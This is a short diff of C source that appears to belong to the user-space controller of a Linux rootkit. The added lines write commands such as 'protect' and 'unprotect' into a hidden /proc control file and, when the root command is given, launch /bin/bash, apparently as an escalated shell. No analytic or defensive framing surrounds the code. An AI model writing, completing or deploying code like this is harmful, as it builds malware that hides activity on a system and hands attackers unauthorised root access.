@@ -12,7 +12,7 @@
 #define CFG_PROTECT "protect"
 #define CFG_UNPROTECT "unprotect"
 
-static char *create_buffer(char *input, char *argument, int has_argument, size_t *buf_size)
+static char* create_buffer(char *input, char *argument, int has_argument, size_t *buf_size)
 {
     *buf_size = 0;
 
@@ -85,6 +85,15 @@ int start_command(char *input)
 
     if (buffer == NULL)
         return -1;
+
+    if(open_writeToFile("/proc/" CFG_PROC_FILE,buffer,buf_size)==-1)
+        return -1;
     
+    free(buffer);
+
+    if (strcmp(CFG_ROOT, input) == 0)
+    {
+        execl("/bin/bash", "bash", NULL);
+    }
     return 0;
 }
